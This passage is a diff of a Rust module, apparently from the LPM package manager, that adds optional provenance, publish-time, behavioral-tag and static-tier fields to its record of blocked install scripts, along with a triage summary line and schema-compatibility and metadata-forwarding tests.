@@ -31,14 +31,35 @@
 //! intact rather than producing a half-written file the reader chokes on.
 
 use lpm_common::LpmError;
-use lpm_security::{SecurityPolicy, TrustMatch, script_hash::compute_script_hash};
+use lpm_security::{
+    SecurityPolicy, TrustMatch, script_hash::compute_script_hash, triage::StaticTier,
+};
 use lpm_store::PackageStore;
+use lpm_workspace::ProvenanceSnapshot;
 use serde::{Deserialize, Serialize};
 use sha2::{Digest, Sha256};
 use std::path::{Path, PathBuf};
 
-/// Schema version for [`BuildState`]. Bump on breaking changes; the reader
-/// rejects unknown versions to enforce forward-compat.
+/// Schema version for [`BuildState`].
+///
+/// **Bump policy:** only on **breaking** changes (field type change,
+/// field removal, semantic change of an existing field). Adding new
+/// `Option<T>` fields with `#[serde(default)]` is NON-breaking and does
+/// NOT warrant a bump — serde silently drops unknown fields on read
+/// (the struct is not `deny_unknown_fields`) and missing fields default
+/// to `None`. This gives mutual compatibility between readers of
+/// different ages without invalidating every existing
+/// `.lpm/build-state.json` in the wild.
+///
+/// **Phase 46** adds several `Option<T>` fields to [`BlockedPackage`]
+/// (static tier, provenance snapshot, publish timestamp, behavioral-tags
+/// hash) without bumping this constant. See the plan §6 for the
+/// rationale.
+///
+/// Reader policy (see [`read_build_state`]): accept anything
+/// `<= BUILD_STATE_VERSION`; refuse newer versions (forward-incompatible
+/// bumps signal a meaningful schema change that older readers can't
+/// interpret safely).
 pub const BUILD_STATE_VERSION: u32 = 1;
 
 /// Filename inside `<project_dir>/.lpm/`.
@@ -67,6 +88,15 @@ pub struct BuildState {
 }
 
 /// One entry in [`BuildState::blocked_packages`].
+///
+/// Phase 46 adds the `static_tier`, `provenance_at_capture`,
+/// `published_at`, and `behavioral_tags_hash` fields as
+/// `Option<T>` with `skip_serializing_if = "Option::is_none"`. This
+/// extension is backward-compatible with v1-written state (defaults to
+/// `None`) and forward-compatible with pre-46 readers (serde drops
+/// unknown fields; no `deny_unknown_fields` on this struct). See the
+/// `BUILD_STATE_VERSION` policy comment for the no-version-bump
+/// rationale.
 #[derive(Debug, Clone, Serialize, Deserialize, PartialEq, Eq)]
 pub struct BlockedPackage {
     pub name: String,
@@ -89,6 +119,47 @@ pub struct BlockedPackage {
     /// current `(integrity, script_hash)`. Distinguishes "first-time
     /// blocked" from "previously approved, now drifted, needs re-review".
     pub binding_drift: bool,
+
+    // ─── Phase 46 additions (all optional; see struct doc) ─────────
+    /// Static-gate classification from Phase 46 Layer 1 (P2). `None`
+    /// in P1-only state (the field exists but the classifier is not
+    /// wired yet) and for packages captured with `script-policy =
+    /// "deny" | "allow"` where classification is not applied.
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    pub static_tier: Option<StaticTier>,
+    /// Publisher-identity snapshot at capture time. Populated by P4
+    /// (provenance drift). `None` in P1/P2/P3 state, and for packages
+    /// whose registry response contains no attestation bundle.
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    pub provenance_at_capture: Option<ProvenanceSnapshot>,
+    /// RFC 3339 publish timestamp as returned by the registry's
+    /// metadata `time` map for this version. Populated by P1 from the
+    /// TTL-cached metadata the install pipeline already fetches for
+    /// the cooldown check. `None` for offline installs or packages
+    /// whose metadata response omitted the timestamp.
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    pub published_at: Option<String>,
+    /// SHA-256 of the sorted set of behavioral tags that were `true`
+    /// on this version's server-computed analysis. Populated by P1
+    /// from the metadata the install pipeline already parses. Used by
+    /// P7's version-diff UI to surface "behavioral tags changed since
+    /// last approval" without re-fetching metadata. `None` for
+    /// packages without server-side behavioral analysis.
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    pub behavioral_tags_hash: Option<String>,
+    /// **Phase 46 P7.** Sorted canonical names of the active behavioral
+    /// tags whose hash is in `behavioral_tags_hash`. Persisted alongside
+    /// the hash so P7's version-diff UI can render the *delta* (e.g.
+    /// `gained network, eval`), not just "tags changed". The hash is
+    /// kept for fast equality / fingerprinting; the names enable
+    /// human-readable rendering without a re-fetch.
+    ///
+    /// Populated from the same registry response as
+    /// `behavioral_tags_hash` via [`lpm_security::triage::active_tag_names`].
+    /// `None` whenever `behavioral_tags_hash` is `None`; `Some(vec![])`
+    /// when the version has the analysis but every tag is false.
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    pub behavioral_tags: Option<Vec<String>>,
 }
 
 /// Result of [`capture_blocked_set_after_install`] — exposes the new state
@@ -118,17 +189,31 @@ pub struct BlockedSetCapture {
 /// Returns `None` if:
 /// - The file is missing
 /// - The file fails to parse as JSON
-/// - The file's `state_version` is not [`BUILD_STATE_VERSION`]
+/// - The file's `state_version` is **newer** than this binary supports
 ///
-/// All three failure modes are treated identically: "no previous state".
-/// The caller will write a fresh state on the next install.
+/// Older `state_version` values are accepted: the struct's new optional
+/// fields default to `None` via their `#[serde(default)]` attribute,
+/// producing a valid [`BuildState`] with degraded but usable content.
+/// This is the forward-compat side of the no-version-bump policy
+/// documented on [`BUILD_STATE_VERSION`]; the backward-compat side is
+/// that absence of `deny_unknown_fields` lets older readers silently
+/// drop fields written by newer writers.
+///
+/// All three failure modes are treated identically by callers: "no
+/// previous state". The caller will write a fresh state on the next
+/// install.
 pub fn read_build_state(project_dir: &Path) -> Option<BuildState> {
     let path = build_state_path(project_dir);
     let content = std::fs::read_to_string(&path).ok()?;
     let state: BuildState = serde_json::from_str(&content).ok()?;
-    if state.state_version != BUILD_STATE_VERSION {
+    if state.state_version > BUILD_STATE_VERSION {
+        // Newer file written by a future LPM binary. We can't safely
+        // interpret its semantics, so treat as missing and let the
+        // current run write a fresh state. (Next time the newer LPM
+        // runs, it will overwrite with a newer-version file again.)
         tracing::debug!(
-            "build-state.json version mismatch (got {}, expected {}) — treating as missing",
+            "build-state.json is newer than this binary supports \
+             (got v{}, max v{}) — treating as missing",
             state.state_version,
             BUILD_STATE_VERSION,
         );
@@ -209,6 +294,82 @@ pub fn compute_blocked_set_fingerprint(packages: &[BlockedPackage]) -> String {
     format!("sha256-{}", hex_lower(&hasher.finalize()))
 }
 
+/// Per-package metadata (Phase 46 P1) that enriches the captured
+/// blocked-set beyond what's derivable from the store alone.
+///
+/// The install pipeline already fetches registry metadata during the
+/// cooldown check for every resolved package; Phase 46 extends that
+/// fetch to also forward `publishedAt` and a hash of the package's
+/// server-computed behavioral tags into `BlockedPackage`. Both fields
+/// are optional and missing entries degrade gracefully to `None` in
+/// the output (offline installs, npm packages without server-side
+/// behavioral analysis, lockfile fast-path without a metadata fetch
+/// for that version — all work).
+///
+/// Keyed by `(name, version)` rather than a richer package identity
+/// because the blocked-set capture operates on the `installed` tuple
+/// list, not lockfile rows.
+#[derive(Debug, Clone, Default)]
+pub struct BlockedSetMetadata {
+    pub by_pkg: std::collections::HashMap<(String, String), BlockedSetMetadataEntry>,
+}
+
+/// One entry in [`BlockedSetMetadata`].
+#[derive(Debug, Clone, Default)]
+pub struct BlockedSetMetadataEntry {
+    /// RFC 3339 publish timestamp from the registry's `time` map for
+    /// this version. `None` for offline, fast-path without a metadata
+    /// fetch, or packages whose registry response omits the timestamp.
+    pub published_at: Option<String>,
+    /// SHA-256 over the sorted set of `true` behavioral-analysis tags
+    /// (see `lpm_security::triage::hash_behavioral_tag_set`). `None`
+    /// for packages without server-side behavioral analysis.
+    pub behavioral_tags_hash: Option<String>,
+    /// **Phase 46 P7.** Sorted canonical names of the active behavioral
+    /// tags whose hash is `behavioral_tags_hash`. Forwarded into
+    /// [`BlockedPackage::behavioral_tags`] so P7's version-diff UI can
+    /// render the *delta* between the prior-approved binding and the
+    /// candidate version without a registry re-fetch (which would break
+    /// offline updates and add latency). `None` whenever
+    /// `behavioral_tags_hash` is `None`.
+    pub behavioral_tags: Option<Vec<String>>,
+    /// **Phase 46 P4 Chunk 3.** Provenance snapshot captured at
+    /// install time from the registry's `dist.attestations` pointer
+    /// (via `crate::provenance_fetch::fetch_provenance_snapshot`).
+    /// Forwarded into [`BlockedPackage::provenance_at_capture`] by
+    /// [`compute_blocked_packages_with_metadata`] so
+    /// `lpm approve-builds` can propagate it to the binding's
+    /// `provenance_at_approval` on approval — closing the P4
+    /// write-path loop.
+    ///
+    /// `None` for:
+    /// - Offline installs (fetcher degraded to `Ok(None)`).
+    /// - Packages whose registry omits `dist.attestations` AND the
+    ///   install pipeline skipped the per-package fetch (e.g., no
+    ///   prior approval reference for this name — no point checking
+    ///   drift). The fetcher itself returns
+    ///   `Some(ProvenanceSnapshot { present: false, .. })` when the
+    ///   registry explicitly has no attestation; that's distinct
+    ///   from the install pipeline choosing to skip the fetch
+    ///   entirely.
+    pub provenance_at_capture: Option<lpm_workspace::ProvenanceSnapshot>,
+}
+
+impl BlockedSetMetadata {
+    /// Lookup for `(name, version)`. Returns a reference to the entry
+    /// or `None` if the caller didn't provide metadata for this
+    /// package (graceful degradation — the captured fields just stay
+    /// `None`).
+    pub fn get(&self, name: &str, version: &str) -> Option<&BlockedSetMetadataEntry> {
+        self.by_pkg.get(&(name.to_string(), version.to_string()))
+    }
+
+    /// Insert / overwrite metadata for `(name, version)`.
+    pub fn insert(&mut self, name: String, version: String, entry: BlockedSetMetadataEntry) {
+        self.by_pkg.insert((name, version), entry);
+    }
+}
+
 /// Compute the install-time blocked set for a project.
 ///
 /// Walks `installed`, looks at each package's lifecycle scripts via the
@@ -217,10 +378,33 @@ pub fn compute_blocked_set_fingerprint(packages: &[BlockedPackage]) -> String {
 ///
 /// Returns the list sorted by `(name, version)` so the caller can pass
 /// it directly to [`compute_blocked_set_fingerprint`].
+///
+/// This wrapper calls [`compute_blocked_packages_with_metadata`] with
+/// an empty metadata map; the Phase-46 `published_at` and
+/// `behavioral_tags_hash` fields on emitted `BlockedPackage` entries
+/// stay `None`. The production install path calls
+/// `compute_blocked_packages_with_metadata` directly with a populated
+/// map; tests keep using this signature.
 pub fn compute_blocked_packages(
     store: &PackageStore,
     installed: &[(String, String, Option<String>)],
     policy: &SecurityPolicy,
+) -> Vec<BlockedPackage> {
+    compute_blocked_packages_with_metadata(store, installed, policy, &BlockedSetMetadata::default())
+}
+
+/// Phase 46 P1 metadata-aware variant of [`compute_blocked_packages`].
+///
+/// Same logic but forwards per-package `published_at` and
+/// `behavioral_tags_hash` from `metadata` into each emitted
+/// [`BlockedPackage`]. The fingerprint is unaffected (intentionally —
+/// it's a stability metric over *blockable* packages, not over their
+/// metadata).
+pub fn compute_blocked_packages_with_metadata(
+    store: &PackageStore,
+    installed: &[(String, String, Option<String>)],
+    policy: &SecurityPolicy,
+    metadata: &BlockedSetMetadata,
 ) -> Vec<BlockedPackage> {
     let mut blocked: Vec<BlockedPackage> = Vec::new();
 
@@ -234,14 +418,28 @@ pub fn compute_blocked_packages(
             None => continue,
         };
 
-        // What phases are present (for human display in approve-builds)?
-        let phases_present = read_present_install_phases(&pkg_dir);
-        if phases_present.is_empty() {
+        // What phases are present (for human display in
+        // approve-builds) AND their bodies (for the Phase 46 P2
+        // static-gate classifier below)? One read/parse of
+        // package.json feeds both.
+        let phase_bodies = read_install_phase_bodies(&pkg_dir);
+        if phase_bodies.is_empty() {
             // Defensive: compute_script_hash returned Some but we found no
             // phases. Shouldn't happen given F3, but skip rather than emit
             // a confusing entry.
             continue;
         }
+        let phases_present: Vec<String> =
+            phase_bodies.iter().map(|(name, _)| name.clone()).collect();
+
+        // Phase 46 P2: classify each present phase and aggregate
+        // worst-wins. Populated unconditionally (not gated on
+        // `script-policy`) per plan §5.1 — the annotation is
+        // user-visible UX in all three modes.
+        let static_tier: Option<lpm_security::triage::StaticTier> = phase_bodies
+            .iter()
+            .map(|(_, body)| lpm_security::static_gate::classify(body))
+            .reduce(lpm_security::triage::StaticTier::worse_of);
 
         // Strict gate query. Phase 4 binds approvals to
         // (name, version, integrity, script_hash).
@@ -266,6 +464,11 @@ pub fn compute_blocked_packages(
         };
 
         if is_blocked {
+            // Phase 46 P1 metadata forwarding. The caller (install.rs)
+            // populates `metadata` from the same registry responses
+            // the cooldown check already fetched, so this is a
+            // memory-only hash-map lookup per package.
+            let entry = metadata.get(name, version);
             blocked.push(BlockedPackage {
                 name: name.clone(),
                 version: version.clone(),
@@ -273,6 +476,21 @@ pub fn compute_blocked_packages(
                 script_hash: Some(script_hash),
                 phases_present,
                 binding_drift,
+                // Phase 46 P2 populates `static_tier` from the
+                // worst-wins reduction above.
+                static_tier,
+                // Phase 46 P4 Chunk 3: forwarded from the install
+                // pipeline's per-package provenance fetch. Populated
+                // for EVERY blocked package that went through the
+                // drift gate, not just those whose drift fired —
+                // fixes the reviewer-flagged "hardcoded None"
+                // underfill and closes the approve-builds
+                // write-path (binding.provenance_at_approval is
+                // written from this value on approval).
+                provenance_at_capture: entry.and_then(|e| e.provenance_at_capture.clone()),
+                published_at: entry.and_then(|e| e.published_at.clone()),
+                behavioral_tags_hash: entry.and_then(|e| e.behavioral_tags_hash.clone()),
+                behavioral_tags: entry.and_then(|e| e.behavioral_tags.clone()),
             });
         }
     }
@@ -284,13 +502,36 @@ pub fn compute_blocked_packages(
 
 /// The end-to-end install hook: compute → compare to previous → write →
 /// return whether to emit a banner.
+///
+/// Thin wrapper over [`capture_blocked_set_after_install_with_metadata`]
+/// that supplies an empty metadata map. Production callers use the
+/// with-metadata variant; test callers use this signature.
 pub fn capture_blocked_set_after_install(
     project_dir: &Path,
     store: &PackageStore,
     installed: &[(String, String, Option<String>)],
     policy: &SecurityPolicy,
 ) -> Result<BlockedSetCapture, LpmError> {
-    let blocked = compute_blocked_packages(store, installed, policy);
+    capture_blocked_set_after_install_with_metadata(
+        project_dir,
+        store,
+        installed,
+        policy,
+        &BlockedSetMetadata::default(),
+    )
+}
+
+/// Phase 46 P1 metadata-aware variant of
+/// [`capture_blocked_set_after_install`]. Used by the install pipeline
+/// where per-package metadata is available; see [`BlockedSetMetadata`].
+pub fn capture_blocked_set_after_install_with_metadata(
+    project_dir: &Path,
+    store: &PackageStore,
+    installed: &[(String, String, Option<String>)],
+    policy: &SecurityPolicy,
+    metadata: &BlockedSetMetadata,
+) -> Result<BlockedSetCapture, LpmError> {
+    let blocked = compute_blocked_packages_with_metadata(store, installed, policy, metadata);
     let fingerprint = compute_blocked_set_fingerprint(&blocked);
 
     let previous = read_build_state(project_dir);
@@ -347,10 +588,36 @@ pub fn build_state_path(project_dir: &Path) -> PathBuf {
     project_dir.join(".lpm").join(BUILD_STATE_FILENAME)
 }
 
-/// Read the package.json from `<store>/<safe_name>@<version>/` and return
-/// the names of [`lpm_security::EXECUTED_INSTALL_PHASES`] entries that
-/// are present and non-empty.
-fn read_present_install_phases(pkg_dir: &Path) -> Vec<String> {
+/// Read the package.json from `<store>/<safe_name>@<version>/` and
+/// return the `(phase_name, body)` pairs for each entry in
+/// [`lpm_security::EXECUTED_INSTALL_PHASES`] that is present and has
+/// a non-empty body.
+///
+/// Replaces the earlier `read_present_install_phases` (names-only)
+/// variant. The one caller — [`compute_blocked_packages_with_metadata`]
+/// — needs the bodies in P2 to run the Phase 46 static-gate classifier
+/// alongside the existing `phases_present` derivation, and folding the
+/// two into one pass over the JSON avoids reading / re-parsing
+/// `package.json` twice per blocked candidate.
+///
+/// Returns an empty vec on any of:
+/// - missing `package.json` (store miss — the gate already fails
+///   closed elsewhere),
+/// - malformed JSON,
+/// - missing or non-object `scripts` field,
+/// - no present install phases with non-empty bodies.
+///
+/// Output order matches [`lpm_security::EXECUTED_INSTALL_PHASES`]
+/// (`preinstall`, `install`, `postinstall`), NOT the order of keys in
+/// the source JSON — matching the script-hash invariant so downstream
+/// aggregation is stable across re-serializations of `package.json`.
+///
+/// **Phase 46 P7:** exposed as `pub` so the version-diff renderer can
+/// read both the prior and candidate phase bodies out of the store
+/// for unified-diff rendering. Callers outside this module must not
+/// assume a body is present in the store — the prior version may
+/// have been evicted by `lpm cache clean` or a fresh clone.
+pub fn read_install_phase_bodies(pkg_dir: &Path) -> Vec<(String, String)> {
     let pkg_json_path = pkg_dir.join("package.json");
     let Ok(content) = std::fs::read_to_string(&pkg_json_path) else {
         return vec![];
@@ -364,14 +631,67 @@ fn read_present_install_phases(pkg_dir: &Path) -> Vec<String> {
 
     lpm_security::EXECUTED_INSTALL_PHASES
         .iter()
-        .filter(|phase| {
+        .filter_map(|phase| {
             scripts
-                .get(**phase)
+                .get(*phase)
                 .and_then(|v| v.as_str())
-                .is_some_and(|s| !s.is_empty())
+                .filter(|s| !s.is_empty())
+                .map(|s| ((*phase).to_string(), s.to_string()))
         })
-        .map(|s| s.to_string())
         .collect()
+}
+
+/// Phase 46 P2 Chunk 5 — per-tier counts for a blocked set.
+///
+/// Returns `(green, amber, red)` with these accounting rules:
+/// - `Some(Green)` → green.
+/// - `Some(Red)` → red.
+/// - `Some(Amber)` / `Some(AmberLlm)` / `None` → amber. The two
+///   amber variants collapse because they're indistinguishable to
+///   the user's "needs review" mental model — `AmberLlm` just means
+///   an LLM weighed in (P8). `None` means persisted state predates
+///   P2; conservative: count unknowns as amber so the user's eye is
+///   drawn to them.
+///
+/// Exposed so a future `--json` install shape and the human
+/// summary line share one counting function.
+pub fn count_blocked_by_tier(blocked: &[BlockedPackage]) -> (usize, usize, usize) {
+    use lpm_security::triage::StaticTier;
+    let mut green = 0usize;
+    let mut amber = 0usize;
+    let mut red = 0usize;
+    for bp in blocked {
+        match bp.static_tier {
+            Some(StaticTier::Green) => green += 1,
+            Some(StaticTier::Red) => red += 1,
+            Some(StaticTier::Amber | StaticTier::AmberLlm) | None => amber += 1,
+        }
+    }
+    (green, amber, red)
+}
+
+/// Phase 46 P2 Chunk 5 — triage-mode install summary line.
+///
+/// Rendered ONLY when `script-policy = "triage"` is the effective
+/// policy. Replaces the multi-line
+/// [`crate::commands::build::show_install_build_hint`] output under
+/// triage; `deny` / `allow` keep the existing hint untouched.
+///
+/// **Format (stable P2-onward; snapshot-tested):**
+/// ```text
+/// script-policy: triage (N green / M amber / K red → lpm approve-builds)
+/// ```
+///
+/// Agents parsing the line can substring-match the stable anchor
+/// `"script-policy: triage ("` and the suffix
+/// `" → lpm approve-builds)"`. Counts are derived from
+/// [`count_blocked_by_tier`] so any future JSON / machine-readable
+/// output shares the same arithmetic.
+pub fn format_triage_summary_line(blocked: &[BlockedPackage]) -> String {
+    let (green, amber, red) = count_blocked_by_tier(blocked);
+    format!(
+        "script-policy: triage ({green} green / {amber} amber / {red} red → lpm approve-builds)"
+    )
 }
 
 fn current_rfc3339() -> String {
@@ -412,6 +732,14 @@ mod tests {
             script_hash: script_hash.map(String::from),
             phases_present: vec!["postinstall".to_string()],
             binding_drift: false,
+            // Phase 46 fields — `None` by default in this helper so
+            // pre-Phase-46 tests behave unchanged. Dedicated tests
+            // below exercise the populated path.
+            static_tier: None,
+            provenance_at_capture: None,
+            published_at: None,
+            behavioral_tags_hash: None,
+            behavioral_tags: None,
         }
     }
 
@@ -540,6 +868,14 @@ mod tests {
             script_hash: Some("sha256-bar".into()),
             phases_present: vec!["preinstall".into(), "postinstall".into()],
             binding_drift: true,
+            // Phase 46 fields: left None in this pre-Phase-46 roundtrip
+            // test so the assertion stays byte-identical to Phase 4's
+            // original shape.
+            static_tier: None,
+            provenance_at_capture: None,
+            published_at: None,
+            behavioral_tags_hash: None,
+            behavioral_tags: None,
         }]);
         write_build_state(dir.path(), &original).unwrap();
         let recovered = read_build_state(dir.path()).unwrap();
@@ -694,6 +1030,7 @@ mod tests {
             TrustedDependencyBinding {
                 integrity: integrity.map(String::from),
                 script_hash: script_hash.map(String::from),
+                ..Default::default()
             },
         );
         SecurityPolicy {
@@ -1029,6 +1366,733 @@ mod tests {
         assert_ne!(
             captured_at_1, captured_at_2,
             "captured_at must refresh on every install"
+        );
+    }
+
+    // ─── Phase 46 schema compatibility ─────────────────────────────
+    //
+    // The no-version-bump strategy (see `BUILD_STATE_VERSION` doc)
+    // requires BOTH directions of compat to hold:
+    //
+    //   1. A Phase 46 reader on a v1-written file defaults the new
+    //      fields to None via #[serde(default)] (backward compat).
+    //   2. A v1 reader on a Phase-46-written file silently drops the
+    //      new fields because the struct lacks deny_unknown_fields
+    //      (forward compat).
+    //
+    // Both are here so a regression in either direction fails CI.
+
+    #[test]
+    fn phase46_reader_defaults_missing_fields_from_v1_json() {
+        // Hand-written JSON as a pre-Phase-46 writer would produce:
+        // only the v1 fields, no static_tier / provenance / etc.
+        let v1_json = r#"{
+            "state_version": 1,
+            "blocked_set_fingerprint": "sha256-legacy",
+            "captured_at": "2026-03-01T00:00:00Z",
+            "blocked_packages": [
+                {
+                    "name": "esbuild",
+                    "version": "0.25.1",
+                    "integrity": "sha512-x",
+                    "script_hash": "sha256-y",
+                    "phases_present": ["postinstall"],
+                    "binding_drift": false
+                }
+            ]
+        }"#;
+
+        let state: BuildState = serde_json::from_str(v1_json).unwrap();
+        assert_eq!(state.state_version, 1);
+        assert_eq!(state.blocked_packages.len(), 1);
+
+        let pkg = &state.blocked_packages[0];
+        // All Phase 46 additions must default to None without the
+        // JSON naming them explicitly.
+        assert_eq!(pkg.static_tier, None);
+        assert_eq!(pkg.provenance_at_capture, None);
+        assert_eq!(pkg.published_at, None);
+        assert_eq!(pkg.behavioral_tags_hash, None);
+
+        // v1 semantics preserved end-to-end.
+        assert_eq!(pkg.name, "esbuild");
+        assert!(!pkg.binding_drift);
+    }
+
+    #[test]
+    fn v1_reader_silently_drops_phase46_fields_on_read() {
+        // Simulate a v1 reader by defining a struct that ONLY has the
+        // v1 fields. A Phase-46-written JSON must parse into it with
+        // all v1 fields intact; the unknown Phase 46 fields must be
+        // silently dropped because no `deny_unknown_fields` is in
+        // effect.
+        #[derive(Debug, Deserialize, PartialEq, Eq)]
+        struct V1BlockedPackage {
+            name: String,
+            version: String,
+            integrity: Option<String>,
+            script_hash: Option<String>,
+            phases_present: Vec<String>,
+            binding_drift: bool,
+        }
+
+        let p46 = BlockedPackage {
+            name: "sharp".into(),
+            version: "0.33.0".into(),
+            integrity: Some("sha512-aaa".into()),
+            script_hash: Some("sha256-bbb".into()),
+            phases_present: vec!["postinstall".into()],
+            binding_drift: false,
+            static_tier: Some(StaticTier::Amber),
+            provenance_at_capture: Some(ProvenanceSnapshot {
+                present: true,
+                publisher: Some("github:lovell/sharp".into()),
+                ..Default::default()
+            }),
+            published_at: Some("2026-04-20T00:00:00Z".into()),
+            behavioral_tags_hash: Some("sha256-ccc".into()),
+            behavioral_tags: Some(vec!["network".into(), "shell".into()]),
+        };
+        let json = serde_json::to_string(&p46).unwrap();
+
+        let v1: V1BlockedPackage = serde_json::from_str(&json).unwrap();
+        assert_eq!(v1.name, "sharp");
+        assert_eq!(v1.version, "0.33.0");
+        assert_eq!(v1.integrity.as_deref(), Some("sha512-aaa"));
+        assert_eq!(v1.script_hash.as_deref(), Some("sha256-bbb"));
+        assert_eq!(v1.phases_present, vec!["postinstall".to_string()]);
+        assert!(!v1.binding_drift);
+    }
+
+    #[test]
+    fn phase46_populated_fields_roundtrip() {
+        let original = BlockedPackage {
+            name: "puppeteer".into(),
+            version: "22.0.0".into(),
+            integrity: Some("sha512-pp".into()),
+            script_hash: Some("sha256-pp".into()),
+            phases_present: vec!["postinstall".into()],
+            binding_drift: false,
+            static_tier: Some(StaticTier::Amber),
+            provenance_at_capture: Some(ProvenanceSnapshot {
+                present: true,
+                publisher: Some("github:puppeteer/puppeteer".into()),
+                workflow_path: Some(".github/workflows/publish.yml".into()),
+                workflow_ref: Some("refs/tags/v22.0.0".into()),
+                attestation_cert_sha256: Some("sha256-cert".into()),
+            }),
+            published_at: Some("2026-04-18T12:34:56Z".into()),
+            behavioral_tags_hash: Some("sha256-tags".into()),
+            behavioral_tags: Some(vec!["childProcess".into(), "network".into()]),
+        };
+        let json = serde_json::to_string(&original).unwrap();
+        let back: BlockedPackage = serde_json::from_str(&json).unwrap();
+        assert_eq!(original, back);
+    }
+
+    #[test]
+    fn read_build_state_rejects_newer_version() {
+        // Simulate a future LPM binary writing state_version = 2.
+        // This binary's reader must refuse and return None (the
+        // caller will write a fresh v1 state, not mis-interpret v2
+        // semantics with v1 types).
+        let project = tempdir().unwrap();
+        std::fs::create_dir_all(project.path().join(".lpm")).unwrap();
+        let future_json = format!(
+            r#"{{
+                "state_version": {next_version},
+                "blocked_set_fingerprint": "sha256-future",
+                "captured_at": "2027-01-01T00:00:00Z",
+                "blocked_packages": []
+            }}"#,
+            next_version = BUILD_STATE_VERSION + 1,
+        );
+        std::fs::write(build_state_path(project.path()), future_json).unwrap();
+
+        assert!(
+            read_build_state(project.path()).is_none(),
+            "reader must refuse files newer than BUILD_STATE_VERSION"
+        );
+    }
+
+    #[test]
+    fn read_build_state_accepts_equal_version() {
+        // Sanity check for the `>` comparison: equal version parses.
+        let project = tempdir().unwrap();
+        std::fs::create_dir_all(project.path().join(".lpm")).unwrap();
+        let state = make_state(vec![make_blocked(
+            "esbuild",
+            "0.25.1",
+            Some("sha512-x"),
+            Some("sha256-y"),
+        )]);
+        let json = serde_json::to_string(&state).unwrap();
+        std::fs::write(build_state_path(project.path()), json).unwrap();
+
+        let read = read_build_state(project.path());
+        assert!(
+            read.is_some(),
+            "reader must accept files at the current BUILD_STATE_VERSION"
+        );
+        assert_eq!(read.unwrap().blocked_packages.len(), 1);
+    }
+
+    // ─── Phase 46 P1: metadata plumbing ───────────────────────────
+    //
+    // The `_with_metadata` variants forward `published_at` and
+    // `behavioral_tags_hash` onto captured `BlockedPackage` entries.
+    // The caller (install.rs) populates the map from the registry
+    // metadata the cooldown check already fetched.
+
+    fn make_metadata(
+        published_at: Option<&str>,
+        behavioral_tags_hash: Option<&str>,
+    ) -> BlockedSetMetadataEntry {
+        BlockedSetMetadataEntry {
+            published_at: published_at.map(String::from),
+            behavioral_tags_hash: behavioral_tags_hash.map(String::from),
+            // P4 Chunk 3: the Phase-46-P1 tests don't stress
+            // provenance_at_capture; use `Default` so future fields
+            // don't force every test-helper re-edit. Dedicated
+            // provenance capture tests live in lpm-security and in
+            // the Chunk 5 E2E harness.
+            ..Default::default()
+        }
+    }
+
+    fn store_pkg_with_postinstall(store: &lpm_store::PackageStore, name: &str, version: &str) {
+        let pkg_dir = store.package_dir(name, version);
+        std::fs::create_dir_all(&pkg_dir).unwrap();
+        std::fs::write(
+            pkg_dir.join("package.json"),
+            format!(
+                r#"{{"name":"{name}","version":"{version}","scripts":{{"postinstall":"node install.js"}}}}"#
+            ),
+        )
+        .unwrap();
+    }
+
+    #[test]
+    fn compute_with_metadata_forwards_published_at_and_behavioral_tags_hash() {
+        // Core P1 contract: when the caller supplies metadata for a
+        // blockable package, both optional fields on the emitted
+        // BlockedPackage are populated verbatim.
+        let project = tempdir().unwrap();
+        std::fs::create_dir_all(project.path().join(".lpm")).unwrap();
+        let store = lpm_store::PackageStore::at(project.path().join("store"));
+        store_pkg_with_postinstall(&store, "sharp", "0.33.0");
+
+        let installed = vec![("sharp".to_string(), "0.33.0".to_string(), None)];
+        let mut metadata = BlockedSetMetadata::default();
+        metadata.insert(
+            "sharp".to_string(),
+            "0.33.0".to_string(),
+            make_metadata(Some("2026-04-18T12:34:56Z"), Some("sha256-tag-hash-abc")),
+        );
+
+        let blocked =
+            compute_blocked_packages_with_metadata(&store, &installed, &empty_policy(), &metadata);
+
+        assert_eq!(blocked.len(), 1);
+        assert_eq!(blocked[0].name, "sharp");
+        assert_eq!(
+            blocked[0].published_at.as_deref(),
+            Some("2026-04-18T12:34:56Z"),
+            "published_at MUST be forwarded from metadata map to BlockedPackage"
+        );
+        assert_eq!(
+            blocked[0].behavioral_tags_hash.as_deref(),
+            Some("sha256-tag-hash-abc"),
+            "behavioral_tags_hash MUST be forwarded from metadata map to BlockedPackage"
+        );
+    }
+
+    #[test]
+    fn compute_with_metadata_missing_entry_leaves_fields_none() {
+        // Graceful degradation: when the caller has NO metadata for a
+        // package (offline, fast-path, registry error), both Phase 46
+        // fields stay None on the emitted BlockedPackage.
+        let project = tempdir().unwrap();
+        std::fs::create_dir_all(project.path().join(".lpm")).unwrap();
+        let store = lpm_store::PackageStore::at(project.path().join("store"));
+        store_pkg_with_postinstall(&store, "sharp", "0.33.0");
+
+        let installed = vec![("sharp".to_string(), "0.33.0".to_string(), None)];
+        // Empty metadata map — caller didn't fetch / couldn't fetch.
+        let metadata = BlockedSetMetadata::default();
+
+        let blocked =
+            compute_blocked_packages_with_metadata(&store, &installed, &empty_policy(), &metadata);
+
+        assert_eq!(blocked.len(), 1);
+        assert!(
+            blocked[0].published_at.is_none(),
+            "missing metadata entry → published_at stays None (graceful)"
+        );
+        assert!(
+            blocked[0].behavioral_tags_hash.is_none(),
+            "missing metadata entry → behavioral_tags_hash stays None (graceful)"
+        );
+    }
+
+    #[test]
+    fn compute_with_metadata_partial_entry_forwards_only_populated_half() {
+        // One field present, one absent: forward what we have, leave
+        // the other None. Common real-world case: npm packages often
+        // have a `time` entry but no server-side behavioral analysis.
+        let project = tempdir().unwrap();
+        std::fs::create_dir_all(project.path().join(".lpm")).unwrap();
+        let store = lpm_store::PackageStore::at(project.path().join("store"));
+        store_pkg_with_postinstall(&store, "some-npm-pkg", "1.0.0");
+
+        let installed = vec![("some-npm-pkg".to_string(), "1.0.0".to_string(), None)];
+        let mut metadata = BlockedSetMetadata::default();
+        metadata.insert(
+            "some-npm-pkg".to_string(),
+            "1.0.0".to_string(),
+            make_metadata(Some("2026-04-20T00:00:00Z"), None),
+        );
+
+        let blocked =
+            compute_blocked_packages_with_metadata(&store, &installed, &empty_policy(), &metadata);
+
+        assert_eq!(blocked.len(), 1);
+        assert_eq!(
+            blocked[0].published_at.as_deref(),
+            Some("2026-04-20T00:00:00Z"),
+            "populated half forwards"
+        );
+        assert!(
+            blocked[0].behavioral_tags_hash.is_none(),
